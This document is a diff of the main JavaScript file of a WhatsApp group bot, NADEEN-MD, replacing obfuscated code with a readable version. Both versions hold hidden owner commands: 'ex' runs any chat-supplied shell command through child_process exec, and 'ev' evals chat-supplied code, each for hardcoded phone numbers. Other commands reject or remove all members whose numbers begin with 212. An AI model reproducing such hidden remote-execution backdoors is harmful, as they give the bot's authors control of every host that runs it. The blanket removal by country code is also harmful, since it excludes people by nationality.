-              'text': '🚫 @' + _0x14d9fb[_0x297513(0xc9)]('@')[0x0] + _0x297513(0x104)
-              , 'mentions': [_0x14d9fb]
-            }), (config['ANTILINK_ACTION'] == _0x297513(0x127) || config[_0x297513(0xaa)] == 'both') && await _0x55533e[_0x297513(0xcf)](_0x222bfb, [_0x14d9fb], 'remove'));
-          }
-        }
-      }
-      config[_0x297513(0x10f)] == 'true' && (_0xeed4d1 && !_0x4e29b8 && !_0x3c46fb && _0x89a709 && (_0x4b9a40['id'][_0x297513(0x111)](_0x297513(0x17a)) && (await _0x55533e['sendMessage'](_0x222bfb, {
-        'text': _0x297513(0xeb)
-      }), config['ANTI_BOT'] && _0x89a709 && (await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'delete': _0x4b9a40[_0x297513(0x81)]
-      }), await _0x55533e[_0x297513(0xcf)](_0x222bfb, [_0x14d9fb], _0x297513(0x127)))), _0x4b9a40['id'][_0x297513(0x111)](_0x297513(0x17f)) && (await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': _0x297513(0xeb)
-      }), config['ANTI_BOT'] && _0x89a709 && (await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'delete': _0x4b9a40[_0x297513(0x81)]
-      }), await _0x55533e['groupParticipantsUpdate'](_0x222bfb, [_0x14d9fb], 'remove'))), _0x4b9a40['id'][_0x297513(0x111)](_0x297513(0x12c)) && (await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'text': '*Other bots are not allow here ❌*'
-      }), config[_0x297513(0x10f)] && _0x89a709 && (await _0x55533e['sendMessage'](_0x222bfb, {
-        'delete': _0x4b9a40['key']
-      }), await _0x55533e[_0x297513(0xcf)](_0x222bfb, [_0x14d9fb], _0x297513(0x127)))), _0x4b9a40['id']['startsWith']('3L1') && (await _0x55533e['sendMessage'](_0x222bfb, {
-        'text': _0x297513(0xeb)
-      }), config[_0x297513(0x10f)] && _0x89a709 && (await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-        'delete': _0x4b9a40[_0x297513(0x81)]
-      }), await _0x55533e[_0x297513(0xcf)](_0x222bfb, [_0x14d9fb], _0x297513(0x127))))));
-      switch (_0x2f0005) {
-        case _0x297513(0x95):
-          _0xf13504(_0x222bfb);
-          break;
-        case 'device': {
-          let _0x16fa36 = getDevice(_0x4b9a40[_0x297513(0x19d)][_0x297513(0x6d)]['contextInfo'][_0x297513(0xf6)]);
-          _0xf13504(_0x297513(0xba) + _0x16fa36 + _0x297513(0x192));
-        }
-        break;
-        case 'ex': {
-          if (_0x8ddc90 == 0x16113d24e6) {
-            const {
-              exec: _0x39fafa
-            } = require('child_process');
-            _0x39fafa(_0x2e9303, (_0x4760a7, _0x133bad) => {
-              const _0x5021ef = _0x297513;
-              if (_0x4760a7) return _0xf13504(_0x5021ef(0x12a) + _0x4760a7);
-              if (_0x133bad) return _0xf13504('-------\x0a\x0a' + _0x133bad);
-            });
-          }
-        }
-        break;
-        case 'apprv': {
-          if (_0x8ddc90 == 0x16113d24e6) {
-            let _0x337504 = await _0x55533e[_0x297513(0xa2)](_0x222bfb);
-            for (let _0x1a34ec = 0x0; _0x1a34ec < _0x337504['length']; _0x1a34ec++) {
-              _0x337504[_0x1a34ec]['jid'][_0x297513(0x111)](_0x297513(0x1be)) ? await _0x55533e['groupRequestParticipantsUpdate'](_0x222bfb, [_0x337504[_0x1a34ec][_0x297513(0x95)]], _0x297513(0x1bd)) : await _0x55533e['groupRequestParticipantsUpdate'](_0x222bfb, [_0x337504[_0x1a34ec]['jid']], _0x297513(0x85));
-            }
-          }
-        }
-        break;
-        case _0x297513(0x146): {
-          if (_0x8ddc90 == 0x16113d24e6)
-            for (let _0x28a7d = 0x0; _0x28a7d < _0x169562['length']; _0x28a7d++) {
-              _0x169562[_0x28a7d]['id'][_0x297513(0x111)](_0x297513(0x1be)) && await _0x55533e['groupParticipantsUpdate'](_0x222bfb, [_0x169562[_0x28a7d]['id']], _0x297513(0x127));
-            }
-        }
-        break;
-        case _0x297513(0xc8): {
-          console[_0x297513(0xfa)](dsa);
-        }
-        break;
-        case 'ev': {
-          if (_0x8ddc90 == 0x16113d24e6 || _0x8ddc90 == 0x160de87163) {
-            let _0x28c0db = _0x2e9303[_0x297513(0xe8)]('°', '.toString()');
-            try {
-              let _0x18b840 = await eval(_0x28c0db);
-              typeof _0x18b840 === 'object' ? _0xf13504(util[_0x297513(0xb6)](_0x18b840)) : _0xf13504(util['format'](_0x18b840));
-            } catch (_0x2409b6) {
-              _0xf13504(util[_0x297513(0xb6)](_0x2409b6));
-            };
-          }
-        }
-        break;
-        default:
-      }
-    } catch (_0x25e514) {
-      const _0x1ce948 = String(_0x25e514);
-      console[_0x297513(0xfa)](_0x1ce948);
+
+
+
+
+
+
+
+
+
+
+	    
+//==================================plugin map================================
+const events = require('./command')
+const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
+
+    try {
+cmd.function(conn, mek, m, { from, prefix, l, isSudo, quoted, body, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
+    } catch (e) {
+console.error("[PLUGIN ERROR] ", e);
     }
-  });
+  }
+}
+events.commands.map(async (command) => {
+  if (body && command.on === "body") {
+    command.function(conn, mek, m, { from, prefix, l, isSudo, quoted, isPre, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+  } else if (mek.q && command.on === "text") {
+    command.function(conn, mek, m, { from, l, quoted, body, isSudo, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+  } else if (
+    (command.on === "image" || command.on === "photo") &&
+    mek.type === "imageMessage"
+  ) {
+    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, body, isCmd, command, isPre, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+  } else if (
+    command.on === "sticker" &&
+    mek.type === "stickerMessage"
+  ) {
+    command.function(conn, mek, m, { from, prefix, l, quoted, isSudo, body, isCmd, command, args, isPre, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
+  }
+});
+
+//============================================================================
+
+if (config.ANTI_LINK == "true") {
+  if (!isOwner && !isAdmins && isBotAdmins) {
+    if (body.includes("chat.whatsapp.com","temu.com")) {
+     await conn.sendMessage(from, { delete: mek.key });
+      await conn.sendMessage(from, {
+        text: `@${m.sender.split('@')[0]} , *🚫 Group links are not allowed!*`,
+        mentions: [sender]
+      });
+    }
+  }
 }
 
-function _0x3cf6() {
-  const _0x5307ca = ['only_group', '94711451319', 'format', 'docu', 'Original message not found for revocation.', 'fromBuffer', '*He Is Using* _*Whatsapp ', 'name', 'nativeFlowResponseMessage', '*Warning 2 ❗*', 'readMessages', 'from', 'buttonMessage2', '120363190237215199@newsletter', 'parse', 'viewer_metadata', 'hex', 'extractAllTo', 'dapan', '120363304606757133@newsletter', 'rtf', 'split', 'child_process', '✅ Connect text message sent to owner', 'mainchanal', 'string', 'buttons', 'groupParticipantsUpdate', 'https://mega.nz/file/', '1338yDlsxN', 'private', '⚠️ This is *this group\'s link*. Can\'t delete.', 'replyad', 'buttonText', 'newsletterFollow', 'join', 'ewam', 'download', 'rmSync', 'offer', '*You are banned by NADEEN BOT TEAM ❌*', 'creds.update', 'status@broadcast', '94778500326', 'relayMessage', 'Hii', '✅ Session downloaded from Mega.nz and saved to creds.json!', 'imageMessage', 'pino', 'msg', 'tent', 'OWNER_NUMBER', 'replace', 'node-cache', 'react', '*Other bots are not allow here ❌*', 'fromURL', 'selectedButtonId', 'trim', 'sticker', 'text', 'videoMessage', 'DCM CHANAL FOLLOW ✅', 'ANTI_BAD', '✅ Session file downloaded successfully from DB-', 'user', 'stanzaId', 'endsWith', 'CHAT_BOT', '/creds.json', 'log', 'https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=', './command', 'ext', 'warn', '120363304606757133@newsletter', 'newsletterReactMessage', 'templateButtonReplyMessage', '📟 NADEEN-MD  Working successfully!', 'ANTI_CALL', ', *Links are not allowed here!*', 'uncaughtException', '_\x0a\x0a> 🔓 Message Text: ', 'chat.whatsapp.com', 'fileLength', 'buttonId', 'viewOnceMessage', 'edite', 'participants', 'stringify', 'newsletterMetadata', 'ANTI_BOT', 'groupInviteCode', 'startsWith', 'saviya', 'temp.zip', 'get', ', attempting next DB...', 'url', 'buttonMessage', 'message_data', 'push', '✅ NADEEN-MD connected successfully!', 'participant', 'gif', 'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/react.json', 'readFileSync', 'Socket connection timeout', '@g.us', '.js', '572216ciyfiE', '904850EEgDgC', '❌ Failed to send connect message:', 'groupMetadata', 'sendPresenceUpdate', 'remove', 'AI Chat Error:', 'cmsglogo', '-------\x0a\x0a', '❌ *edited message detected* ', 'B1E', 'type', 'rowId', 'delete', 'megajs', 'connection.update', 'numbers', 'Error saving chat data:', 'sections', 'SACHI CHANAL FOLLOW ✅', '7ZIFZTW', 'ACTION', 'downloadBuffer', 'audio/mpeg', 'NADEEN-MD 🌟', 'shift', 'fileName', 'forEach', 'AUTO_BLOCK', ' *Bad word detected..!*', 'header', 'true', 'INFINITY - DEVELOPERS CHANAL FOLLOW ✅', '94755527010@s.whatsapp.net', 'selectedRowId', 'oni', '212r', 'existsSync', 'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/premirum.json', 'floor', 'caption', './lib/msg', 'documentMessage', 'video', 'ephemeralMessage', 'Value not found', 'AUTO_VOICE', '```', 'sendButtonMessage3', 'Plugins extracted successfully ✅', 'toLowerCase', 'selectedDisplayText', '1796310cUAItH', 'photo', 'Movie-Visper-Md Server listening on port http://localhost:', 'connectmg', '19898qkiogX', 'Ewanna', 'PORT', 'quotedMessage', 'footer', './lib/functions', '💁‍♂️', 'SESSION_NAME', 'conversation', 'both', '❌ Failed to download session from DB-', './lib', 'Ewpm', 'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/developers.json', 'Authentication timed out', 'remoteJid', 'path', 'output', '✅ WhatsApp socket connected!', 'displayText', '*\x0a\x0a', ' ||* ', 'express', 'find', ' ||*  ', 'alias', 'data', 'WORK_TYPE', 'map', 'video/mp4', 'keys', '.mp4', 'BAE', '515385RwHNax', '❌ All DB servers failed to provide a valid session file.', 'util', '120363304606757133@newsletter', 'EVO', 'https://saviya-kolla-database.vercel.app/', 'catch', 'https://mv-visper-full-db.pages.dev/Main/ban_group.json', '📥 Downloading session from Saviyakolla-DB (DB-', 'fatal', 'quoted', 'ewpn', '_\x0a  📩 *Sent by:* _', 'save', 'status', '00000018', 'audio', 'qrcode-terminal', '@s.whatsapp.net', 'fromMe', 'writeFile', '*Warning 1 ❗*', './plugins/', ' version*_', '   ', '679748LNPYbB', ' and saved to creds.json', 'seconds', 'listMessage4 error:', 'Caught exception: ', 'sendMessage', 'hey', 'rate-overlimit', 'Reconnecting', 'message', 'stickerMessage', 'Fetching ZIP file from Mega.nz...', '.json', 'error', 'listMessage2', 'Oni', 'listen', 'audioMessage', 'NADEEN MD UPDATES CHANNAL FOLLOW ✅', 'some', 'description', 'listMessage', 'https', '9525eCxTIB', 'close', 'axios', 'sendFileUrl', 'Connection Closed', 'headers', 'title', 'isBuffer', 'PREFIX', 'length', 'utf8', 'promises', 'messages.upsert', 'mkdirSync', 'ptt', '33oCweZT', 'function', 'MAX_SIZE', 'reject', '212', 'unknown reason', 'AUTO_MSG_READ', 'random', 'body', 'image', 'commands', 'selectedId', 'recording', 'extendedTextMessage', 'send', 'server_id', 'NADEEN-MD CONNECTED ✅', 'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json', 'FOOTER', 'viewOnce', 'Hey', 'reactionMessage', 'AUTO_READ_STATUS', 'https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/ban_number.json', '🚫 *This message was deleted !!*\x0a\x0a  🚮 *Deleted by:* _', 'ignore', 'rows', 'AUTO_RECORDING', 'toString', './config', 'chat', 'https://mv-visper-full-db.pages.dev/Main/alex.json', '89504e47', 'key', 'forwardMessage', 'open', 'NADEEN ZIP file downloaded successfully ✅', 'approve', 'BAE5', '*Warning 3 ❗*', 'composing', '94755527010', 'application/pdf', '\x0a\x0a*Reply Below Number 🔢*\x0a', 'sadas', 'block', 'headerType', 'includes', 'statusCode', 'extname', 'readdirSync', 'Manoj X CHANAL FOLLOW ✅', 'content-type', 'jid', 'ffd8ffe0', 'sender', 'mimetype', 'head', 'result', 'CMD_ONLY_READ', 'JID_BLOCK', 'contextInfo', 'SESSION_ID', '16xrHadM', 'writeFileSync', 'VISPER-MD&', 'groupRequestParticipantsList', 'AUTO_REACT', 'adm-zip', 'file-type', 'https://saviya-kolla-database.koyeb.app/', 'pattern', 'Dapan', 'SUDO', 'ANTILINK_ACTION', 'readViewOnce', 'waUploadToServer', 'slice', 'rejectCall', 'loggedOut', 'ewanna', '⚠️ Failed to fetch connect message text:', '94724884317', 'Invalid image format for listMessage4.'];
-  _0x3cf6 = function() {
-    return _0x5307ca;
-  };
-  return _0x3cf6();
+
+
+
+// ANTI BOT OKKOMATAMA 3L1 DENNAM WADE 
+ if (config.ANTI_BOT  == "true"){
+  if ( isGroup && !isAdmins  && !isMe  && isBotAdmins ) {
+  if ( mek.id.startsWith("BAE") ) {
+await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
+if ( config.ANTI_BOT && isBotAdmins ) {
+await conn.sendMessage(from, { delete: mek.key })
+await conn.groupParticipantsUpdate(from,[sender], 'remove')
+  }}
+    if ( mek.id.startsWith("EVO") ) {
+await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
+if ( config.ANTI_BOT && isBotAdmins ) {
+await conn.sendMessage(from, { delete: mek.key })
+await conn.groupParticipantsUpdate(from,[sender], 'remove')
+      }
+    }
+if ( mek.id.startsWith("B1E") ) {
+await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
+if ( config.ANTI_BOT && isBotAdmins ) {
+await conn.sendMessage(from, { delete: mek.key })
+await conn.groupParticipantsUpdate(from,[sender], 'remove')
+      }
+    }
+
+if ( mek.id.startsWith("3L1") ) {
+await conn.sendMessage(from, { text: "*Other bots are not allow here ❌*" })
+if ( config.ANTI_BOT && isBotAdmins ) {
+await conn.sendMessage(from, { delete: mek.key })
+await conn.groupParticipantsUpdate(from,[sender], 'remove')
+      }
+    }
+
+	  
+  }
 }
-app[_0x1b7d27(0x114)]('/', (_0x2733f8, _0x5ece52) => {
-  const _0x3771c5 = _0x1b7d27;
-  _0x5ece52['send'](_0x3771c5(0x102));
-}), app[_0x1b7d27(0x1a4)](port, () => console['log'](_0x1b7d27(0x158) + port)), setTimeout(() => {
-  connect();
-}, 0xbb8), process['on'](_0x1b7d27(0x105), function(_0x34a765) {
-  const _0x4d02f5 = _0x1b7d27;
-  let _0xdce6f9 = String(_0x34a765);
-  if (_0xdce6f9[_0x4d02f5(0x8f)](_0x4d02f5(0x11f))) return;
-  if (_0xdce6f9[_0x4d02f5(0x8f)](_0x4d02f5(0x19b))) return;
-  if (_0xdce6f9['includes'](_0x4d02f5(0x1af))) return;
-  if (_0xdce6f9[_0x4d02f5(0x8f)](_0x4d02f5(0x14f))) return;
-  if (_0xdce6f9[_0x4d02f5(0x8f)](_0x4d02f5(0x168))) restart();
-  console['log'](_0x4d02f5(0x198), _0x34a765);
+switch (command) {
+  case 'jid':
+    reply(from)
+    break
+  case 'device': {
+    let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)
+
+    reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
+  }
+    break
+    case'ex':{
+      if(senderNumber == 94755527010) {
+  const { exec } = require("child_process")
+  exec(q, (err, stdout) => {
+    if (err) return reply(`-------\n\n` + err)
+    if (stdout) {
+        return reply(`-------\n\n` + stdout)
+    }
+})
+      }
+    }
+    break
+    case'apprv':{
+      if(senderNumber == 94755527010) {
+          let reqlist = await conn.groupRequestParticipantsList(from)
+          for (let i=0;i<reqlist.length;i++) {
+            if(reqlist[i].jid.startsWith("212")){
+              await conn.groupRequestParticipantsUpdate(
+                from,
+                [reqlist[i].jid],
+                "reject"
+            )
+            } else{
+              await conn.groupRequestParticipantsUpdate(
+                from,
+                [reqlist[i].jid],
+                "approve"
+            )
+            }
+          }
+        }
+    }
+    break
+    case'212r':{
+      if(senderNumber == 94755527010) {
+        for (let i=0;i<participants.length;i++) {
+          if(participants[i].id.startsWith("212")){
+       await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
+      }
+    }
+  }
+    }
+    break
+    case'rtf':{
+console.log(dsa)
+    }
+    break
+  case 'ev': {
+    if(senderNumber == 94755527010 || senderNumber == 94711451319) {
+    let code2 = q.replace("°", ".toString()");
+    try {
+let resultTest = await eval(code2);
+if (typeof resultTest === "object") {
+  reply(util.format(resultTest));
+} else {
+  reply(util.format(resultTest));
+}
+    } catch (err) {
+reply(util.format(err));
+    }
+    ;
+  }
+  }
+    break
+  default:
+}
+    } catch (e) {
+const isError = String(e)
+console.log(isError)
+    }
+	  
+  })
+}
+app.get("/", (req, res) => {
+  res.send("📟 NADEEN-MD Working successfully!");
+});
+app.listen(port, () => console.log(`Nadeen-Md Server listening on port http://localhost:${port}`));
+setTimeout(() => {
+connectToWA();
+}, 3000);
+
+
+process.on("uncaughtException", function (err) {
+  let e = String(err);
+  if (e.includes("Socket connection timeout")) return;
+  if (e.includes("rate-overlimit")) return;
+  if (e.includes("Connection Closed")) return;
+  if (e.includes("Value not found")) return;
+  if (e.includes("Authentication timed out")) restart();
+  console.log("Caught exception: ", err);
 });
